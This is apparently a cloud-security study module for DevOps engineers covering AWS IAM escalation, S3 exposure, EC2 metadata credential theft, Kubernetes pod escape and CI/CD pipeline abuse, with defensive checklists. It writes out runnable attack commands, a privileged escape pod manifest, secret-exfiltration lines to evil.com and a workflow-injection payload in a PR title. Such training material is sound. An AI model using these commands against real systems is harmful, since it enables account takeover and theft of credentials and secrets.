# 06 — Cloud Security: Core Concepts & Attacker Thinking

> As a DevOps engineer, this is YOUR domain. You already know these services — now learn how attackers abuse them.

---

## 🔴 AWS Security

### IAM Misconfigurations

```
THE #1 AWS ATTACK VECTOR

IAM (Identity and Access Management) controls who can do what in AWS.
Misconfigurations here = complete account compromise.
```

#### Common IAM Misconfigurations

| Misconfiguration | Impact | How To Find |
|-----------------|--------|-------------|
| `*` permissions | Full account access | Check policy documents |
| Overly permissive roles | Privilege escalation | `aws iam list-attached-role-policies` |
| Unused access keys | Stale credentials, easier to steal | `aws iam list-access-keys` |
| No MFA on privileged accounts | Account takeover via credential theft | `aws iam list-mfa-devices` |
| Cross-account trust too broad | Lateral movement between accounts | Check trust policies |
| Instance profiles with admin | EC2 compromise = admin access | SSRF → metadata → creds |
| Hardcoded access keys | Leaked in code, CI/CD logs, env vars | GitHub search, .env files |

#### AWS Privilege Escalation Paths

```bash
# 21 known IAM privilege escalation methods
# Reference: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/

# 1. iam:CreatePolicyVersion — Create new policy version with admin
aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/MyPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 2. iam:SetDefaultPolicyVersion — Switch to more permissive version
aws iam set-default-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/MyPolicy --version-id v2

# 3. iam:AttachUserPolicy — Attach AdministratorAccess to yourself
aws iam attach-user-policy --user-name myuser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 4. iam:AttachRolePolicy — Attach admin policy to a role you can assume
aws iam attach-role-policy --role-name MyRole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/MyRole --role-session-name pwned

# 5. iam:PutUserPolicy — Inline policy with admin perms
aws iam put-user-policy --user-name myuser --policy-name AdminPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

# 6. Lambda:CreateFunction + iam:PassRole — Execute code as privileged role
aws lambda create-function --function-name backdoor \
  --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/AdminRole \
  --handler lambda_function.handler --zip-file fileb://function.zip

# 7. ec2:RunInstances + iam:PassRole — Launch EC2 with admin role
aws ec2 run-instances --image-id ami-12345 --instance-type t2.micro \
  --iam-instance-profile Name=AdminProfile

# 8. sts:AssumeRole — Assume a more privileged role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/AdminRole --role-session-name test
```

### S3 Bucket Exposure

```bash
# Check if bucket exists and is public
aws s3 ls s3://target-bucket --no-sign-request
# If this works → publicly accessible!

# List bucket contents
aws s3 ls s3://target-bucket --no-sign-request --recursive

# Download everything
aws s3 sync s3://target-bucket ./loot --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request

# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# Common bucket naming patterns to test:
# target-backup, target-dev, target-staging, target-logs,
# target-assets, target-data, target-uploads, target-config
# target.com, www.target.com, api.target.com

# Write test (if write access exists)
echo "test" > test.txt
aws s3 cp test.txt s3://target-bucket/test.txt --no-sign-request
```

### EC2 Metadata Service (SSRF Target)

```bash
# IMDSv1 (easy to exploit via SSRF)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token

# Use stolen credentials
export AWS_ACCESS_KEY_ID=stolen_key
export AWS_SECRET_ACCESS_KEY=stolen_secret
export AWS_SESSION_TOKEN=stolen_token
aws sts get-caller-identity  # Verify access
aws iam list-users           # Start enumerating

# IMDSv2 (harder — requires PUT request for token first)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### AWS Enumeration (With Credentials)

```bash
# Who am I?
aws sts get-caller-identity

# What can I do? (enumerate permissions)
# Use enumerate-iam tool:
pip3 install enumerate-iam
python3 enumerate-iam.py --access-key KEY --secret-key SECRET

# Or manually:
aws iam list-users
aws iam list-roles
aws iam list-groups
aws iam list-policies --only-attached
aws iam get-user-policy --user-name myuser --policy-name mypolicy
aws s3 ls
aws ec2 describe-instances
aws lambda list-functions
aws rds describe-db-instances
aws secretsmanager list-secrets
```

---

## 🔴 Kubernetes Security

### RBAC Misconfigurations

```bash
# Check your permissions
kubectl auth can-i --list

# Common dangerous permissions:
# pods/exec → Execute commands in any pod
# secrets → Read all secrets (including service account tokens)
# create pods → Create privileged pods to escape to host
# * on * → Full admin access

# Check for cluster-admin bindings
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .metadata.name + " → " + (.subjects[]?.name // "unknown")'

# Check service account permissions
kubectl auth can-i --list --as system:serviceaccount:default:default
```

### Pod Escape

```bash
# Check if pod is privileged
cat /proc/1/status | grep -i cap
# CapEff: 0000003fffffffff → All capabilities = privileged pod

# Escape Method 1: Privileged pod with hostPID
# If running in privileged pod:
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# You're now on the host!

# Escape Method 2: Mount host filesystem
# Create a privileged pod:
cat << 'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: exploit
spec:
  containers:
  - name: exploit
    image: ubuntu
    command: ["sleep", "infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
  hostPID: true
  hostNetwork: true
EOF

kubectl exec -it exploit -- chroot /host /bin/bash
# You're root on the node!

# Escape Method 3: Service account token to API server
# Default token location in pod:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Use token to access API server:
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets
```

### Secrets Exposure

```bash
# List all secrets
kubectl get secrets --all-namespaces

# Read a secret
kubectl get secret SECRET_NAME -o jsonpath='{.data}' | jq
# Decode base64
kubectl get secret SECRET_NAME -o jsonpath='{.data.password}' | base64 -d

# Find secrets in environment variables (running pods)
kubectl get pods -o json | jq -r '.items[].spec.containers[].env[]? | select(.valueFrom.secretKeyRef) | .name + " → " + .valueFrom.secretKeyRef.name'

# Secrets in mounted volumes
kubectl get pods -o json | jq -r '.items[].spec.volumes[]? | select(.secret) | .secret.secretName'

# Common sensitive secrets:
# docker-registry credentials
# TLS certificates and private keys
# Database credentials
# API keys
# Service account tokens
```

### Kubernetes Attack Checklist

```
□ Anonymous access to API server?
  curl -k https://APISERVER:6443/api/v1/
□ Dashboard exposed without auth?
  curl -k https://APISERVER:30000/ (or port 443/8443)
□ etcd exposed? (port 2379)
  curl -k https://ETCD_IP:2379/v2/keys
□ Kubelet API exposed? (port 10250)
  curl -k https://NODE_IP:10250/pods
□ Service account with excessive permissions?
  kubectl auth can-i --list
□ Secrets readable?
  kubectl get secrets --all-namespaces
□ Can create privileged pods?
  kubectl auth can-i create pods
□ Pod security policies/standards enforced?
□ Network policies in place?
□ RBAC properly configured?
```

---

## 🔴 CI/CD Pipeline Security

### Secret Leaks

```
COMMON PLACES SECRETS LEAK:
├── Git commit history → git log --all -p | grep -iE "password|secret|key|token"
├── CI/CD environment variables → printed in logs
├── Build artifacts → Docker images contain build-time secrets
├── Configuration files committed → .env, config.yml, secrets.yaml
├── Error messages → Stack traces include connection strings
└── Dependency manifests → Lockfiles may reference private registries with tokens
```

### Pipeline Abuse Vectors

```bash
# 1. Poisoned Pull Request
# Submit a PR that modifies CI config to exfiltrate secrets:
# .github/workflows/ci.yml:
# - run: echo ${{ secrets.AWS_ACCESS_KEY }} | base64 | curl -d @- https://evil.com

# 2. Dependency Confusion
# Register a package with same name as internal package on public registry
# When CI runs npm install / pip install, it installs YOUR malicious package

# 3. Build Script Injection
# If CI runs user-controllable scripts:
# Inject: curl https://evil.com/steal?secret=$SECRET_KEY

# 4. Docker Layer Extraction
# Pull a public Docker image:
docker pull target/app:latest
docker history target/app:latest  # Shows build commands
# Extract layers and search for secrets:
docker save target/app:latest -o image.tar
tar xf image.tar
find . -name "*.tar" -exec tar xf {} \;
grep -rn "password\|secret\|key\|token" . 2>/dev/null

# 5. GitHub Actions Workflow Injection
# If a workflow uses: ${{ github.event.pull_request.title }}
# Set PR title to: a]]; curl evil.com?s=$SECRET; echo [[a
```

### GitHub Actions Security

```yaml
# Vulnerable workflow (runs on PR from fork — attacker-controlled code runs with secrets):
on:
  pull_request_target:  # DANGEROUS — runs in context of base repo
    types: [opened]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # CHECKS OUT ATTACKER'S CODE
      - run: npm install && npm test  # Runs attacker's code with repo secrets
```

```bash
# Check for exposed GitHub tokens
# In any CI/CD log, look for:
# GITHUB_TOKEN (expires after workflow, but powerful during runtime)
# Personal Access Tokens (persistent)
# Deploy keys
# NPM tokens
# Docker Hub tokens

# GitLab CI variables
# Check: Settings → CI/CD → Variables
# Protected variables only available on protected branches
# But masked variables might still be extracted via: echo $VAR | base64
```

---

## 🔴 Cloud Attack Cheatsheet

```
AWS ATTACK CHAIN:
SSRF → Metadata → IAM creds → Enumerate permissions → Privilege escalation → Account takeover

KUBERNETES ATTACK CHAIN:
Exposed dashboard → Default creds → Pod shell → Service account token → Secrets → Node escape

CI/CD ATTACK CHAIN:
Code access → Pipeline modification → Secret extraction → Infrastructure compromise

S3 ATTACK CHAIN:
Discover bucket → Public read → Find credentials in files → Use creds for AWS access
```

---

## 📋 Cloud Security Checklist

```
AWS:
□ IAM users with console access have MFA
□ Root account has MFA and no access keys
□ No * permissions in IAM policies
□ Access keys rotated < 90 days
□ S3 buckets not publicly accessible
□ CloudTrail logging enabled
□ GuardDuty enabled
□ EC2 instances use IMDSv2
□ Secrets in Secrets Manager, not env vars
□ VPCs properly segmented

KUBERNETES:
□ API server not publicly exposed
□ Dashboard requires authentication
□ RBAC properly configured (no cluster-admin for apps)
□ Pod Security Standards enforced
□ Network Policies implemented
□ Secrets encrypted at rest
□ etcd encrypted and access-controlled
□ Kubelet API requires authentication
□ Node auto-update enabled
□ Image scanning in pipeline

CI/CD:
□ Secrets not printed in build logs
□ Fork PRs don't have access to secrets
□ Dependencies pinned (not using latest)
□ No secrets in codebase (use secret scanning)
□ Pipeline runs with least privilege
□ Build environments are ephemeral
□ Docker images scanned for vulnerabilities
□ Supply chain security (SLSA, sigstore)
```

---

## 🧠 Attacker Thinking: Cloud-Specific

```
As a DevOps engineer, you have insider knowledge:
1. You know how IAM roles are typically configured → You know where the gaps are
2. You know CI/CD pipelines → You know how secrets flow through the system
3. You know Kubernetes → You know the default configs that are dangerous
4. You know Terraform/IaC → You can spot misconfigurations in code

Your DevOps background IS your competitive advantage in cloud pentesting.
```
